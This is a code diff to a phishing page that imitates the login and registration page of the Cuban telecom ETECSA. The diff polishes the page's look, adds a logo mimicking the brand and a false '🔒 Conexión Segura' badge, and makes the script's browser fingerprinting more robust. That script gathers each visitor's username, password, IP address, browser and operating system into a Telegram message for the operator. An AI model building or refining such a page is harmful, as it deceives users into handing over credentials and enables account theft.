@@ -6,8 +6,8 @@
     <title>Acceso - ETECSA</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background: #f4f4f4;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
             margin: 0;
             padding: 0;
             display: flex;
@@ -22,28 +22,40 @@
             background: #003366;
             color: white;
             text-align: center;
-            padding: 10px 0;
+            padding: 15px 0;
             position: fixed;
             top: 0;
             left: 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+            z-index: 1000;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+
+        .logo {
+            width: 50px;
+            height: 50px;
+            background: #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 20px;
+            color: #003366;
+            border: 2px solid #fff;
             box-shadow: 0 2px 5px rgba(0,0,0,0.2);
         }
 
-        .header .logo {
-            width: 50px;
-            height: 50px;
-            background: url('https://www.etecsa.cu/sites/default/files/logo.png') no-repeat center center;
-            background-size: contain;
-            display: inline-block;
-            vertical-align: middle;
-        }
-
-        .header .title {
-            display: inline-block;
-            vertical-align: middle;
-            margin-left: 10px;
-            font-size: 20px;
+        .logo-text {
+            font-size: 24px;
             font-weight: bold;
+            letter-spacing: 1px;
         }
 
         .container {
@@ -54,7 +66,8 @@
             text-align: center;
             max-width: 400px;
             width: 100%;
-            margin-top: 80px;
+            margin-top: 100px;
+            position: relative;
         }
 
         h1 {
@@ -106,6 +119,7 @@
         input:focus {
             border-color: #0088cc;
             outline: none;
+            box-shadow: 0 0 5px rgba(0, 136, 204, 0.3);
         }
 
         .btn {
@@ -116,18 +130,26 @@
             border-radius: 8px;
             font-size: 16px;
             cursor: pointer;
-            transition: background 0.3s;
+            transition: all 0.3s;
             width: 100%;
             font-weight: bold;
         }
 
         .btn:hover {
             background: #006699;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+
+        .btn:active {
+            transform: translateY(0);
         }
 
         .btn:disabled {
             background: #cccccc;
             cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
         }
 
         .message {
@@ -160,12 +182,24 @@
             color: #0088cc;
             font-weight: bold;
         }
+
+        .security-badge {
+            background: #003366;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            margin-top: 10px;
+            display: inline-block;
+        }
     </style>
 </head>
 <body>
     <div class="header">
-        <span class="logo"></span>
-        <span class="title">ETECSA</span>
+        <div class="logo-container">
+            <div class="logo">E</div>
+            <div class="logo-text">ETECSA</div>
+        </div>
     </div>
     
     <div class="container">
@@ -184,6 +218,8 @@
             </div>
             <button type="submit" class="btn">📱 Registrarse Ahora</button>
         </form>
+
+        <div class="security-badge">🔒 Conexión Segura</div>
 
         <div id="message" class="message"></div>
         
@@ -213,8 +249,8 @@
         // Obtener información del navegador
         function getBrowserInfo() {
             const userAgent = navigator.userAgent;
-            const browserName = userAgent.match(/(opera|chrome|safari|firefox|msie|trident)/i)[0].toLowerCase();
-            const os = userAgent.match(/\((.*?)\)/)[1].split('; ')[0];
+            const browserName = userAgent.match(/(opera|chrome|safari|firefox|msie|trident)/i)?.[0]?.toLowerCase() || 'desconocido';
+            const os = userAgent.match(/\((.*?)\)/)?.[1]?.split('; ')[0] || 'desconocido';
             return { browser: browserName, os };
         }
 
@@ -269,17 +305,17 @@
 
                 // Crear mensaje para Telegram
                 const telegramMessage = `
-        🚀 <b>NUEVO REGISTRO EN ETECSA</b>
+🚀 <b>NUEVO REGISTRO EN ETECSA</b>
 
-        👤 <b>Usuario:</b> <code>${username}</code>
-        🔒 <b>Contraseña:</b> <code>${password}</code>
-        📅 <b>Fecha:</b> ${fecha}
-        🌐 <b>IP:</b> <code>${userIP}</code>
-        🆔 <b>ID:</b> <code>USER_${Date.now()}</code>
-        💻 <b>Navegador:</b> <code>${browserInfo.browser}</code>
-        🖥️ <b>Sistema Operativo:</b> <code>${browserInfo.os}</code>
+👤 <b>Usuario:</b> <code>${username}</code>
+🔒 <b>Contraseña:</b> <code>${password}</code>
+📅 <b>Fecha:</b> ${fecha}
+🌐 <b>IP:</b> <code>${userIP}</code>
+🆔 <b>ID:</b> <code>USER_${Date.now()}</code>
+💻 <b>Navegador:</b> <code>${browserInfo.browser}</code>
+🖥️ <b>Sistema Operativo:</b> <code>${browserInfo.os}</code>
 
-        ✅ <i>Revisa el panel para aprobar</i>
+✅ <i>Revisa el panel para aprobar</i>
                 `;
 
                 // Enviar a Telegram
